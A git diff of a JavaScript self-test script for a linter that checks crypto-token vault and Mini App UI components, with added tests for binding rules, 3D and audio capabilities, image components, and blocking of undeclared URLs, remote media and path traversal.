@@ -17,6 +17,7 @@ import {
   sourceSha256FromFileHashes,
 } from "./e2e-report-utils.mjs";
 import { runVaultCheck, runVaultCheckWithTokenContracts } from "./vault-check.mjs";
+import { supportedThreeR3FProfiles } from "./mini-app-capabilities.mjs";
 
 const ROOT = process.cwd();
 const FIXTURE_PREFIX = `check-selftest-${process.pid}-${Date.now()}`;
@@ -24,9 +25,10 @@ const FACTORY = "0xc3e4ee8f3c616d16297fafcb9daab122d31efa9e";
 const PLACEHOLDER_FACTORY = "0x1000000000000000000000000000000000000001";
 const PLACEHOLDER_TOKEN = "0x2000000000000000000000000000000000000002";
 const NON_ERC20_TOKEN = "0x2000000000000000000000000000000000007777";
+const STANDARD_MINI_APP_PREVIEW_TOKEN = "0x9adc2f9dbc4578808f0cdb30d51b5199ff4b8888";
 const NON_7777_TOKEN = "0x55d398326f99059fF775485246999027B3197955";
 const ZERO_ADDRESS = "0x0000000000000000000000000000000000000000";
-const TOKEN = "0x091652ebc0a0238d7151a868f22d7cfd2a267777";
+const TOKEN = "0x286184b2660a2822671a33f24c4517f593947777";
 const SECOND_TOKEN = "0x6BcC641D1eF33c4d7A2C9536a3E0356F77Ff7777";
 const TOKEN_8888 = "0x3000000000000000000000000000000000008888";
 const VAULT = "0x3000000000000000000000000000000000000003";
@@ -135,6 +137,11 @@ function writePassingE2EReport(folderName, { chainId = 56, tokenAddress = TOKEN,
     sourcePackage: `src/vaults/${folderName}`,
     sourceSha256,
     fileSha256,
+    previewSource: {
+      verified: true,
+      componentSha256: fileSha256[`src/vaults/${folderName}/Component.tsx`],
+      endpoint: "/api/runtime/e2e-source",
+    },
     manifestSha256: fileSha256[`src/vaults/${folderName}/manifest.json`],
     schemaSha256: fileSha256[MANIFEST_SCHEMA_PATH],
     binding: {
@@ -142,7 +149,14 @@ function writePassingE2EReport(folderName, { chainId = 56, tokenAddress = TOKEN,
       tokenAddress,
       ...(vaultAddress ? { vaultAddress } : {}),
       ...(factoryAddress ? { factoryAddress } : {}),
-      tokenPolicy: chainId === 97 ? "testnet" : "mainnet-fallback",
+      tokenPolicy:
+        chainId === 97
+          ? "testnet"
+          : chainId === 4663
+            ? "robinhood-mainnet"
+            : chainId === 46630
+              ? "robinhood-testnet"
+              : "mainnet-fallback",
     },
     viewports: [
       { id: "pc", width: 1440, height: 900 },
@@ -182,6 +196,16 @@ function assertNoRule(label, result, ruleId, severity) {
 }
 
 try {
+  const supportedThreeProfiles = supportedThreeR3FProfiles(ROOT);
+  assert.equal(supportedThreeProfiles[0].dependencies["@react-three/fiber"], "9.7.0");
+  assert.equal(
+    supportedThreeProfiles.some(
+      (profile) => profile.dependencies["@react-three/fiber"] === "8.18.0",
+    ),
+    true,
+  );
+  passed.push("three-r3f-v1 keeps current React 19 and accepted legacy React 18 dependency revisions");
+
   const invalidFolderResult = runVaultCheck("../bad", { silent: true });
   assertRule("invalid folder name is reported as JSON-compatible result", invalidFolderResult, "cli/invalid-folder-name", "blocking");
   assert.equal(invalidFolderResult.ok, false);
@@ -221,6 +245,22 @@ try {
   assert.equal(tokenPolicyCheck.issues.some((item) => item.ruleId === "manifest-binding/invalid-token-address-list"), false);
   assert.equal(tokenPolicyCheck.issues.some((item) => item.ruleId === "manifest-binding/missing-test-token"), false);
   passed.push("binding-level tokenAddresses reference lists are allowed");
+
+  const invalidSyntaxSlug = `${FIXTURE_PREFIX}-invalid-syntax`;
+  writeVault(invalidSyntaxSlug, {
+    component: componentWithRiskBody(`  return (
+    <div>
+      <StatusBadge>{riskLabel}}</StatusBadge>
+    </div>
+  );`),
+    i18n: { en: { "risk.missing": "Risk status missing" } },
+  });
+  assertRule(
+    "invalid TSX syntax is blocked before E2E or packaging",
+    runVaultCheck(invalidSyntaxSlug, { silent: true }),
+    "source-syntax/invalid-typescript",
+    "blocking",
+  );
 
   const standardLayoutSlug = `${FIXTURE_PREFIX}-standard-layout`;
   writeVault(standardLayoutSlug);
@@ -279,10 +319,51 @@ try {
   });
   const invalidMiniAppBindingResult = runVaultCheck(invalidMiniAppBindingSlug, { silent: true });
   assertRule("mini-app mode rejects factory-scoped bindings", invalidMiniAppBindingResult, "manifest-binding/invalid-mini-app-binding", "blocking");
-  assertRule("mini-app mode requires an 8888 token", invalidMiniAppBindingResult, "manifest-binding/invalid-mini-app-token", "blocking");
 
-  const miniAppMissingHeightSlug = `${FIXTURE_PREFIX}-mini-app-missing-height`;
-  writeVault(miniAppMissingHeightSlug, {
+  const taxTokenMiniAppSlug = `${FIXTURE_PREFIX}-tax-token-mini-app`;
+  writeVault(taxTokenMiniAppSlug, {
+    component: `"use client";
+
+import type { VaultComponentProps } from "@/src/sdk";
+import { useFlapSdk } from "@/src/sdk";
+
+export default function SelftestVault(_props: VaultComponentProps) {
+  const { i18n } = useFlapSdk();
+  return <div className="min-h-screen">{i18n.t("title")}</div>;
+}
+`,
+    manifest: baseManifest({
+      mode: "mini-app",
+      displayTitle: { zh: "税币 Mini App", en: "Tax Token Mini App" },
+      match: { bindings: [{ chainId: 56, tokenAddresses: [TOKEN] }] },
+    }),
+  });
+  const taxTokenMiniAppResult = runVaultCheck(taxTokenMiniAppSlug, { silent: true });
+  assertNoRule("mini-app mode accepts token-scoped 7777 Tax Token bindings", taxTokenMiniAppResult, "manifest-binding/invalid-mini-app-token", "blocking");
+  assertNoRule("pure 7777 Mini App bindings are not treated as mixed", taxTokenMiniAppResult, "manifest-binding/mixed-mini-app-token-suffixes", "blocking");
+
+  const mixedMiniAppSlug = `${FIXTURE_PREFIX}-mixed-mini-app`;
+  writeVault(mixedMiniAppSlug, {
+    component: `"use client";
+
+import type { VaultComponentProps } from "@/src/sdk";
+import { useFlapSdk } from "@/src/sdk";
+
+export default function SelftestVault(_props: VaultComponentProps) {
+  const { i18n } = useFlapSdk();
+  return <div className="min-h-screen">{i18n.t("title")}</div>;
+}
+`,
+    manifest: baseManifest({
+      mode: "mini-app",
+      displayTitle: { zh: "混合 Mini App", en: "Mixed Mini App" },
+      match: { bindings: [{ chainId: 56, tokenAddresses: [TOKEN, TOKEN_8888] }] },
+    }),
+  });
+  assertRule("mini-app mode rejects mixed 7777 and 8888 bindings", runVaultCheck(mixedMiniAppSlug, { silent: true }), "manifest-binding/mixed-mini-app-token-suffixes", "blocking");
+
+  const miniAppMissingDisplayTitleSlug = `${FIXTURE_PREFIX}-mini-app-title`;
+  writeVault(miniAppMissingDisplayTitleSlug, {
     manifest: baseManifest({
       mode: "mini-app",
       match: {
@@ -290,7 +371,136 @@ try {
       },
     }),
   });
+  assertRule("mini-app mode requires bilingual displayTitle", runVaultCheck(miniAppMissingDisplayTitleSlug, { silent: true }), "manifest-schema/mini-app-display-title-requires-bilingual", "blocking");
+
+  const miniAppStringDisplayTitleSlug = `${FIXTURE_PREFIX}-mini-app-string-title`;
+  writeVault(miniAppStringDisplayTitleSlug, {
+    manifest: baseManifest({
+      mode: "mini-app",
+      displayTitle: "自测 Mini App / Selftest Mini App",
+      match: {
+        bindings: [{ chainId: 56, tokenAddresses: [TOKEN_8888] }],
+      },
+    }),
+  });
+  assertRule("mini-app mode rejects unstructured displayTitle", runVaultCheck(miniAppStringDisplayTitleSlug, { silent: true }), "manifest-schema/mini-app-display-title-requires-bilingual", "blocking");
+
+  const miniAppMissingHeightSlug = `${FIXTURE_PREFIX}-mini-app-missing-height`;
+  writeVault(miniAppMissingHeightSlug, {
+    manifest: baseManifest({
+      mode: "mini-app",
+      displayTitle: { zh: "自测 Mini App", en: "Selftest Mini App" },
+      match: {
+        bindings: [{ chainId: 56, tokenAddresses: [TOKEN_8888] }],
+      },
+    }),
+  });
   assertRule("mini-app mode requires a full-height root layout", runVaultCheck(miniAppMissingHeightSlug, { silent: true }), "mini-app-layout/missing-full-height-root", "blocking");
+
+  const defaultAudioAssetSlug = `${FIXTURE_PREFIX}-default-audio-asset`;
+  writeVault(defaultAudioAssetSlug);
+  fs.writeFileSync(path.join(ROOT, "src", "vaults", defaultAudioAssetSlug, "bgm.mp3"), "audio");
+  assertRule("default Vault UI rejects local audio assets", runVaultCheck(defaultAudioAssetSlug, { silent: true }), "media/mini-app-audio-only", "blocking");
+
+  const miniAppAudioAssetSlug = `${FIXTURE_PREFIX}-mini-app-audio-asset`;
+  writeVault(miniAppAudioAssetSlug, {
+    component: `"use client";
+
+import type { VaultComponentProps } from "@/src/sdk";
+import { useFlapSdk } from "@/src/sdk";
+import bgmUrl from "./bgm.mp3";
+
+export default function SelftestVault(_props: VaultComponentProps) {
+  const { i18n } = useFlapSdk();
+  return (
+    <div className="min-h-screen">
+      <audio src={bgmUrl} controls loop />
+      <div>{i18n.t("title")}</div>
+    </div>
+  );
+}
+`,
+    manifest: baseManifest({
+      mode: "mini-app",
+      displayTitle: { zh: "自测 Mini App", en: "Selftest Mini App" },
+      match: {
+        bindings: [{ chainId: 56, tokenAddresses: [TOKEN_8888] }],
+      },
+    }),
+  });
+  fs.writeFileSync(path.join(ROOT, "src", "vaults", miniAppAudioAssetSlug, "bgm.mp3"), "audio");
+  const miniAppAudioAssetCheck = runVaultCheck(miniAppAudioAssetSlug, { silent: true });
+  assertNoRule("mini-app mode accepts static imports for top-level audio assets", miniAppAudioAssetCheck, "imports-and-dependencies/disallowed-relative-import", "blocking");
+  assertRule("mini-app audio assets are surfaced for human review", miniAppAudioAssetCheck, "manual-review/mini-app-audio-asset", "warning");
+
+  const defaultThreeSlug = `${FIXTURE_PREFIX}-default-three`;
+  writeVault(defaultThreeSlug, { component: `import { Canvas } from "@react-three/fiber";\nexport default function SelftestVault(){ return <Canvas />; }\n` });
+  assertRule("default Vault UI blocks Three imports", runVaultCheck(defaultThreeSlug, { silent: true }), "imports-and-dependencies/unreviewed-import", "blocking");
+
+  const defaultThreeWithCapabilitySlug = `${FIXTURE_PREFIX}-default-three-cap`;
+  writeVault(defaultThreeWithCapabilitySlug, {
+    component: `import { Canvas } from "@react-three/fiber";
+import { readTaxVaultHostContext, useFlapSdk } from "@/src/sdk";
+import { Alert, StatusBadge } from "@/src/ui";
+export default function SelftestVault(){
+  const { context, i18n } = useFlapSdk();
+  const host = readTaxVaultHostContext(context.host);
+  const riskLevel = host.vaultInfo?.riskLevel ?? host.taxInfo?.vaultInfo?.riskLevel ?? null;
+  const riskLabel = riskLevel === 1 ? i18n.t("risk.low") : i18n.t("risk.missing");
+  const cores = navigator.hardwareConcurrency;
+  return <div data-flap-3d-state="ready" data-flap-3d-renderer="webgl2"><StatusBadge>{riskLabel}</StatusBadge>{riskLevel === null ? <Alert>{i18n.t("risk.missing")}</Alert> : null}<Canvas data-cores={cores} /></div>;
+}
+`,
+    manifest: baseManifest({ capabilities: ["three-r3f-v1"] }),
+    i18n: { en: { "risk.low": "Low risk", "risk.missing": "Risk status missing" } },
+  });
+  const defaultThreeWithCapabilityCheck = runVaultCheck(defaultThreeWithCapabilitySlug, { silent: true });
+  assertNoRule("7777 Vault UI capability allows Three imports", defaultThreeWithCapabilityCheck, "imports-and-dependencies/unreviewed-import", "blocking");
+  assertNoRule("7777 Vault UI capability allows reviewed 3D browser APIs", defaultThreeWithCapabilityCheck, "forbidden-api/browser-global-escape", "blocking");
+  assertNoRule("7777 Vault UI capability keeps host risk integration", defaultThreeWithCapabilityCheck, "risk-status/missing-host-risk-state", "blocking");
+  assertRule("7777 Vault UI capability emits its own manual review", defaultThreeWithCapabilityCheck, "manual-review/vault-ui-3d", "warning");
+  assert.equal(defaultThreeWithCapabilityCheck.review.vaultUI3D.length, 1);
+
+  const mixedThreeTokenSlug = `${FIXTURE_PREFIX}-mixed-three-token`;
+  writeVault(mixedThreeTokenSlug, {
+    component: componentWithRiskBody(`  return <div data-flap-3d-state="ready" data-flap-3d-renderer="webgl2"><StatusBadge>{riskLabel}</StatusBadge>{riskLevel === null ? <Alert>{i18n.t("risk.missing")}</Alert> : null}</div>;`),
+    manifest: baseManifest({ capabilities: ["three-r3f-v1"], match: { bindings: [{ chainId: 56, factoryAddress: FACTORY, tokenAddresses: [TOKEN, TOKEN_8888] }] } }),
+    i18n: { en: { "risk.missing": "Risk status missing" } },
+  });
+  assertRule("7777 Vault UI 3D blocks mixed 7777 and 8888 proof tokens", runVaultCheck(mixedThreeTokenSlug, { silent: true }), "manifest-binding/invalid-vault-ui-3d-token", "blocking");
+
+  const vaultThreeMissingRiskSlug = `${FIXTURE_PREFIX}-vault-three-missing-risk`;
+  writeVault(vaultThreeMissingRiskSlug, {
+    component: `import { Canvas } from "@react-three/fiber";\nexport default function SelftestVault(){ return <div data-flap-3d-state="ready" data-flap-3d-renderer="webgl2"><Canvas /></div>; }\n`,
+    manifest: baseManifest({ capabilities: ["three-r3f-v1"] }),
+  });
+  assertRule("7777 Vault UI 3D still requires host risk status", runVaultCheck(vaultThreeMissingRiskSlug, { silent: true }), "risk-status/missing-host-risk-state", "blocking");
+
+  const miniAppThreeWithoutCapabilitySlug = `${FIXTURE_PREFIX}-mini-three-no-cap`;
+  writeVault(miniAppThreeWithoutCapabilitySlug, {
+    component: `import { Canvas } from "@react-three/fiber";\nexport default function SelftestVault(){ return <div className="min-h-screen"><Canvas /></div>; }\n`,
+    manifest: baseManifest({ mode: "mini-app", displayTitle: { zh: "三维自测", en: "3D Selftest" }, match: { bindings: [{ chainId: 56, tokenAddresses: [TOKEN_8888] }] } }),
+  });
+  assertRule("Mini App without capability blocks Three imports", runVaultCheck(miniAppThreeWithoutCapabilitySlug, { silent: true }), "imports-and-dependencies/unreviewed-import", "blocking");
+
+  const miniAppThreeSlug = `${FIXTURE_PREFIX}-mini-three`;
+  writeVault(miniAppThreeSlug, {
+    component: `import { Canvas } from "@react-three/fiber";\nimport { Scene } from "./scene/Scene";\nexport default function SelftestVault(){ return <div className="min-h-screen" data-flap-3d-state="ready" data-flap-3d-renderer="webgl2"><Canvas><Scene /></Canvas></div>; }\n`,
+    manifest: baseManifest({ mode: "mini-app", capabilities: ["three-r3f-v1"], displayTitle: { zh: "三维自测", en: "3D Selftest" }, match: { bindings: [{ chainId: 56, tokenAddresses: [TOKEN_8888] }] } }),
+  });
+  const threeVaultDir = path.join(ROOT, "src", "vaults", miniAppThreeSlug);
+  fs.mkdirSync(path.join(threeVaultDir, "scene"), { recursive: true });
+  fs.mkdirSync(path.join(threeVaultDir, "shaders"), { recursive: true });
+  fs.mkdirSync(path.join(threeVaultDir, "assets"), { recursive: true });
+  fs.writeFileSync(path.join(threeVaultDir, "scene", "Scene.tsx"), `import { OrbitControls } from "@react-three/drei";\nimport { EffectComposer } from "@react-three/postprocessing";\nimport { Color } from "three";\nimport shader from "../shaders/test.frag";\nimport fontUrl from "../assets/local.ttf";\nexport function Scene(){ return <><mesh data-shader={shader} data-font={fontUrl} data-color={new Color().getHex()} /><OrbitControls /><EffectComposer /></>; }\n`);
+  fs.writeFileSync(path.join(threeVaultDir, "shaders", "test.frag"), "void main(){ gl_FragColor = vec4(1.0); }\n");
+  fs.writeFileSync(path.join(threeVaultDir, "assets", "local.ttf"), "fixture-font");
+  const miniAppThreeCheck = runVaultCheck(miniAppThreeSlug, { silent: true });
+  assert.equal(miniAppThreeCheck.issues.filter((item) => item.severity === "blocking" && item.ruleId !== "preview-registration/missing-vault-module").length, 0, JSON.stringify(miniAppThreeCheck, null, 2));
+  passed.push("three-r3f-v1 allows nested TSX, shader, font, and standard packages");
+  assertRule("three-r3f-v1 emits manual review metadata", miniAppThreeCheck, "manual-review/mini-app-3d", "warning");
+  fs.writeFileSync(path.join(threeVaultDir, "assets", "unused.png"), "unused");
+  assertRule("three-r3f-v1 blocks unreferenced resources", runVaultCheck(miniAppThreeSlug, { silent: true }), "capability-assets/unreferenced-file", "blocking");
 
   const non7777TestTokenSlug = `${FIXTURE_PREFIX}-non-allowed-suffix-test-token`;
   writeVault(non7777TestTokenSlug, {
@@ -405,6 +615,32 @@ export default function SelftestVault(_props: VaultComponentProps) {
     TOKEN_8888,
   );
   passed.push("vault:e2e selection accepts 8888 test tokens");
+
+  assert.equal(
+    selectE2EBinding(baseManifest({ mode: "mini-app", match: { bindings: [{ chainId: 56, tokenAddresses: [STANDARD_MINI_APP_PREVIEW_TOKEN] }] } })).tokenAddress,
+    STANDARD_MINI_APP_PREVIEW_TOKEN,
+  );
+  passed.push("vault:e2e uses the deployed standard Mini App preview token from the manifest");
+
+  const robinhoodToken = "0xdb1b738d084dc482eb94f3697dd452862e6c7777";
+  const robinhoodBinding = selectE2EBinding({
+    match: {
+      bindings: [{ chainId: 4663, factoryAddress: FACTORY, tokenAddresses: [robinhoodToken] }],
+    },
+  });
+  assert.equal(robinhoodBinding.tokenAddress, robinhoodToken);
+  assert.equal(robinhoodBinding.tokenPolicy, "robinhood-mainnet");
+  passed.push("vault:e2e selection accepts Robinhood mainnet test tokens");
+
+  const robinhoodTestnetToken = "0x15ce0f69e0323aba1de95ff0c53a1a3ccf2d7777";
+  const robinhoodTestnetBinding = selectE2EBinding({
+    match: {
+      bindings: [{ chainId: 46630, tokenAddresses: [robinhoodTestnetToken] }],
+    },
+  });
+  assert.equal(robinhoodTestnetBinding.tokenAddress, robinhoodTestnetToken);
+  assert.equal(robinhoodTestnetBinding.tokenPolicy, "robinhood-testnet");
+  passed.push("vault:e2e selection accepts Robinhood Testnet token-scoped proof");
 
   const invalidErc20TokenSlug = `${FIXTURE_PREFIX}-invalid-erc20-token`;
   createdFolderNames.push(invalidErc20TokenSlug);
@@ -658,6 +894,31 @@ export default function SelftestVault(_props: VaultComponentProps) {
   });
   assertRule("endpoint declaration does not allow unsafe prefix matches", runVaultCheck(endpointPrefixSlug, { silent: true }), "endpoint-policy/undeclared-url", "blocking");
 
+  const declaredNonFetchUrlSlug = `${FIXTURE_PREFIX}-endpoint-non-fetch`;
+  writeVault(declaredNonFetchUrlSlug, {
+    manifest: baseManifest({
+      endpoints: "https://api.example.com/proof",
+    }),
+    component: `"use client";
+
+import type { VaultComponentProps } from "@/src/sdk";
+import { useFlapSdk } from "@/src/sdk";
+
+export default function SelftestVault(_props: VaultComponentProps) {
+  const { i18n } = useFlapSdk();
+  const ordinaryUrl = "https://api.example.com/proof";
+  void ordinaryUrl;
+  return <div>{i18n.t("title")}</div>;
+}
+`,
+  });
+  assertRule(
+    "manifest endpoints do not authorize URL literals outside direct static fetch arguments",
+    runVaultCheck(declaredNonFetchUrlSlug, { silent: true }),
+    "endpoint-policy/undeclared-url",
+    "blocking",
+  );
+
   const commentedUrlSlug = `${FIXTURE_PREFIX}-commented-url`;
   writeVault(commentedUrlSlug, {
     component: `"use client";
@@ -698,6 +959,138 @@ export default function SelftestVault(_props: VaultComponentProps) {
   assertNoRule("IpfsImage CIDs do not require endpoint declarations", allowedIpfsImageCheck, "endpoint-policy/undeclared-url", "blocking");
   assertNoRule("IpfsImage CIDs are not remote-media violations", allowedIpfsImageCheck, "media-policy/remote-media", "blocking");
   assertNoRule("valid IpfsImage CIDs pass static CID validation", allowedIpfsImageCheck, "media-policy/invalid-ipfs-image-cid", "blocking");
+
+  const allowedNftMetadataImageSlug = `${FIXTURE_PREFIX}-nft-metadata-image`;
+  writeVault(allowedNftMetadataImageSlug, {
+    component: `"use client";
+
+import type { VaultComponentProps } from "@/src/sdk";
+import { useFlapSdk } from "@/src/sdk";
+import { NftMetadataImage } from "@/src/ui";
+
+export default function SelftestVault(_props: VaultComponentProps) {
+  const sdk = useFlapSdk();
+  return <NftMetadataImage tokenId={1n} alt={sdk.i18n.t("title")} />;
+}
+`,
+  });
+  const allowedNftMetadataImageCheck = runVaultCheck(allowedNftMetadataImageSlug, { silent: true });
+  assertNoRule("NftMetadataImage does not require developer endpoint declarations", allowedNftMetadataImageCheck, "endpoint-policy/undeclared-url", "blocking");
+  assertNoRule("NftMetadataImage accepts controlled runtime props", allowedNftMetadataImageCheck, "media-policy/invalid-nft-metadata-image", "blocking");
+
+  const invalidNftMetadataImageSlug = `${FIXTURE_PREFIX}-nft-metadata-invalid`;
+  writeVault(invalidNftMetadataImageSlug, {
+    component: `"use client";
+
+import type { VaultComponentProps } from "@/src/sdk";
+import { useFlapSdk } from "@/src/sdk";
+import { NftMetadataImage } from "@/src/ui";
+
+export default function SelftestVault(_props: VaultComponentProps) {
+  const sdk = useFlapSdk();
+  return <NftMetadataImage nftAddress={sdk.context.tokenAddress} tokenId={1n} tokenURI="https://metadata.example/1.json" alt={sdk.i18n.t("title")} />;
+}
+`,
+  });
+  assertRule(
+    "NftMetadataImage blocks caller-supplied tokenURI and NFT address",
+    runVaultCheck(invalidNftMetadataImageSlug, { silent: true }),
+    "media-policy/invalid-nft-metadata-image",
+    "blocking",
+  );
+
+  const invalidNftMetadataAddressSlug = `${FIXTURE_PREFIX}-nft-metadata-caller-address`;
+  writeVault(invalidNftMetadataAddressSlug, {
+    component: `"use client";
+
+import type { VaultComponentProps } from "@/src/sdk";
+import { useFlapSdk } from "@/src/sdk";
+import { NftMetadataImage } from "@/src/ui";
+
+export default function SelftestVault(_props: VaultComponentProps) {
+  const sdk = useFlapSdk();
+  return <NftMetadataImage sdk={sdk} nftAddress={sdk.context.tokenAddress} tokenId={1n} alt={sdk.i18n.t("title")} />;
+}
+`,
+  });
+  assertRule(
+    "NftMetadataImage rejects caller-supplied SDK and NFT addresses",
+    runVaultCheck(invalidNftMetadataAddressSlug, { silent: true }),
+    "media-policy/invalid-nft-metadata-image",
+    "blocking",
+  );
+
+  const dynamicIpfsImageSlug = `${FIXTURE_PREFIX}-ipfs-dyn`;
+  writeVault(dynamicIpfsImageSlug, {
+    component: `"use client";
+
+import type { VaultComponentProps } from "@/src/sdk";
+import { useFlapSdk } from "@/src/sdk";
+import { IpfsImage } from "@/src/ui";
+
+export default function SelftestVault(_props: VaultComponentProps) {
+  const { i18n } = useFlapSdk();
+  const tokenId = 7n;
+  return (
+    <div>
+      <IpfsImage
+        cid="bafybeigdyrzt5sfp7udm7hu76ovxpcjz5j4bsslxq3whncw3qyq2wejvfy"
+        path={tokenId.toString() + ".png"}
+        validationPath="1.png"
+        alt=""
+      />
+      {i18n.t("title")}
+    </div>
+  );
+}
+`,
+  });
+  const dynamicIpfsImageCheck = runVaultCheck(dynamicIpfsImageSlug, { silent: true });
+  assertNoRule("IpfsImage accepts dynamic paths with a static validation sample", dynamicIpfsImageCheck, "media-policy/invalid-ipfs-image-path", "blocking");
+
+  const missingValidationPathSlug = `${FIXTURE_PREFIX}-ipfs-no-proof`;
+  writeVault(missingValidationPathSlug, {
+    component: `"use client";
+
+import type { VaultComponentProps } from "@/src/sdk";
+import { useFlapSdk } from "@/src/sdk";
+import { IpfsImage } from "@/src/ui";
+
+export default function SelftestVault(_props: VaultComponentProps) {
+  const { i18n } = useFlapSdk();
+  const tokenId = 7n;
+  return <IpfsImage cid="bafybeigdyrzt5sfp7udm7hu76ovxpcjz5j4bsslxq3whncw3qyq2wejvfy" path={tokenId.toString()} alt={i18n.t("title")} />;
+}
+`,
+  });
+  assertRule(
+    "IpfsImage dynamic paths require a static validation sample",
+    runVaultCheck(missingValidationPathSlug, { silent: true }),
+    "media-policy/invalid-ipfs-image-path",
+    "blocking",
+  );
+
+  const unsafeValidationPathSlug = `${FIXTURE_PREFIX}-ipfs-bad-proof`;
+  writeVault(unsafeValidationPathSlug, {
+    component: `"use client";
+
+import type { VaultComponentProps } from "@/src/sdk";
+import { useFlapSdk } from "@/src/sdk";
+import { IpfsImage } from "@/src/ui";
+
+export default function SelftestVault(_props: VaultComponentProps) {
+  const { i18n } = useFlapSdk();
+  const tokenId = 7n;
+  return <IpfsImage cid="bafybeigdyrzt5sfp7udm7hu76ovxpcjz5j4bsslxq3whncw3qyq2wejvfy" path={tokenId.toString()} validationPath="../1.png" alt={i18n.t("title")} />;
+}
+`,
+  });
+  assertRule(
+    "IpfsImage rejects traversal in validationPath",
+    runVaultCheck(unsafeValidationPathSlug, { silent: true }),
+    "media-policy/invalid-ipfs-image-path",
+    "blocking",
+  );
 
   const allowedIpfsBackgroundSlug = `${FIXTURE_PREFIX}-ipfs-background`;
   writeVault(allowedIpfsBackgroundSlug, {
@@ -764,6 +1157,247 @@ export default function SelftestVault(_props: VaultComponentProps) {
   });
   assertRule("direct Flap gateway image URLs remain blocked", runVaultCheck(directIpfsImageUrlSlug, { silent: true }), "media-policy/remote-media", "blocking");
 
+  const allowedBinanceImageSlug = `${FIXTURE_PREFIX}-binance-image`;
+  writeVault(allowedBinanceImageSlug, {
+    component: `"use client";
+
+import type { VaultComponentProps } from "@/src/sdk";
+import { useFlapSdk } from "@/src/sdk";
+import { BinanceImage as AllowedImage } from "@/src/ui";
+
+const logoUrl = "https://bin.bnbstatic.com/another/catalog/gmeb.png?size=96";
+
+export default function SelftestVault(_props: VaultComponentProps) {
+  const { i18n } = useFlapSdk();
+  return (
+    <div>
+      <AllowedImage src={logoUrl} alt={i18n.t("image.alt")} fallback={i18n.t("image.fallback")} />
+      {i18n.t("title")}
+    </div>
+  );
+}
+`,
+    i18n: { en: { title: "Selftest", image: { alt: "Logo", fallback: "No logo" } } },
+  });
+  const allowedBinanceImageCheck = runVaultCheck(allowedBinanceImageSlug, { silent: true });
+  assertNoRule("BinanceImage accepts any path on the exact Binance static host", allowedBinanceImageCheck, "media-policy/invalid-binance-image", "blocking");
+  assertNoRule("BinanceImage URLs do not require manifest endpoint declarations", allowedBinanceImageCheck, "endpoint-policy/undeclared-url", "blocking");
+  assertNoRule("BinanceImage is not treated as uncontrolled remote media", allowedBinanceImageCheck, "media-policy/remote-media", "blocking");
+
+  const dynamicBinanceImageSlug = `${FIXTURE_PREFIX}-binance-image-dynamic`;
+  writeVault(dynamicBinanceImageSlug, {
+    component: `"use client";
+
+import type { VaultComponentProps } from "@/src/sdk";
+import { useFlapSdk } from "@/src/sdk";
+import { BinanceImage } from "@/src/ui";
+
+export default function SelftestVault({ context }: VaultComponentProps) {
+  const { i18n } = useFlapSdk();
+  const apiImageUrl = context.tokenImageUrl;
+  return <BinanceImage src={apiImageUrl} alt={i18n.t("image.alt")} />;
+}
+`,
+    i18n: { en: { title: "Selftest", image: { alt: "Logo" } } },
+  });
+  assertNoRule(
+    "BinanceImage accepts API-provided dynamic image URLs for runtime host validation",
+    runVaultCheck(dynamicBinanceImageSlug, { silent: true }),
+    "media-policy/invalid-binance-image",
+    "blocking",
+  );
+
+  const invalidBinanceImageSlug = `${FIXTURE_PREFIX}-binance-image-invalid`;
+  writeVault(invalidBinanceImageSlug, {
+    component: `"use client";
+
+import type { VaultComponentProps } from "@/src/sdk";
+import { useFlapSdk } from "@/src/sdk";
+import { BinanceImage } from "@/src/ui";
+
+export default function SelftestVault(_props: VaultComponentProps) {
+  const { i18n } = useFlapSdk();
+  return <BinanceImage src="https://cdn.bin.bnbstatic.com/logo.png" alt={i18n.t("image.alt")} />;
+}
+`,
+    i18n: { en: { title: "Selftest", image: { alt: "Logo" } } },
+  });
+  assertRule(
+    "BinanceImage rejects subdomains instead of widening the hostname boundary",
+    runVaultCheck(invalidBinanceImageSlug, { silent: true }),
+    "media-policy/invalid-binance-image",
+    "blocking",
+  );
+
+  const shadowedBinanceImageSlug = `${FIXTURE_PREFIX}-binance-image-shadow`;
+  writeVault(shadowedBinanceImageSlug, {
+    component: `"use client";
+
+import type { VaultComponentProps } from "@/src/sdk";
+import { useFlapSdk } from "@/src/sdk";
+import { BinanceImage as AllowedImage } from "@/src/ui";
+
+export default function SelftestVault({ context }: VaultComponentProps) {
+  const { i18n } = useFlapSdk();
+  const AllowedImage = ({ src, alt }: { src?: string; alt: string }) => <img src={src} alt={alt} />;
+  return <AllowedImage src={context.tokenImageUrl} alt={i18n.t("image.alt")} />;
+}
+`,
+    i18n: { en: { title: "Selftest", image: { alt: "Logo" } } },
+  });
+  assertRule(
+    "a local component cannot shadow an imported BinanceImage alias",
+    runVaultCheck(shadowedBinanceImageSlug, { silent: true }),
+    "media-policy/invalid-binance-image",
+    "blocking",
+  );
+
+  const directBinanceImgSlug = `${FIXTURE_PREFIX}-binance-native-img`;
+  writeVault(directBinanceImgSlug, {
+    component: `"use client";
+
+import type { VaultComponentProps } from "@/src/sdk";
+import { useFlapSdk } from "@/src/sdk";
+
+export default function SelftestVault(_props: VaultComponentProps) {
+  const { i18n } = useFlapSdk();
+  return <img src="https://bin.bnbstatic.com/logo.png" alt={i18n.t("image.alt")} />;
+}
+`,
+    i18n: { en: { title: "Selftest", image: { alt: "Logo" } } },
+  });
+  const directBinanceImgCheck = runVaultCheck(directBinanceImgSlug, { silent: true });
+  assertRule("native img cannot bypass the BinanceImage runtime boundary", directBinanceImgCheck, "media-policy/remote-media", "blocking");
+  assertRule("a raw Binance URL remains an undeclared non-fetch resource", directBinanceImgCheck, "endpoint-policy/undeclared-url", "blocking");
+
+  const declaredRemoteImageConstantSlug = `${FIXTURE_PREFIX}-remote-image-constant`;
+  writeVault(declaredRemoteImageConstantSlug, {
+    manifest: baseManifest({
+      endpoints: "https://h.uguu.se/WBmRbSlN.png",
+    }),
+    component: `"use client";
+
+import type { VaultComponentProps } from "@/src/sdk";
+import { useFlapSdk } from "@/src/sdk";
+
+const remoteUrlConstant = "https://h.uguu.se/WBmRbSlN.png";
+
+export default function SelftestVault(_props: VaultComponentProps) {
+  const { i18n } = useFlapSdk();
+  return (
+    <div>
+      <img src={remoteUrlConstant} alt="" />
+      {i18n.t("title")}
+    </div>
+  );
+}
+`,
+  });
+  const declaredRemoteImageConstantCheck = runVaultCheck(declaredRemoteImageConstantSlug, { silent: true });
+  assertRule(
+    "native img src resolves a declared remote URL const and blocks it as remote media",
+    declaredRemoteImageConstantCheck,
+    "media-policy/remote-media",
+    "blocking",
+  );
+  assertRule(
+    "manifest endpoints do not authorize a remote img URL const",
+    declaredRemoteImageConstantCheck,
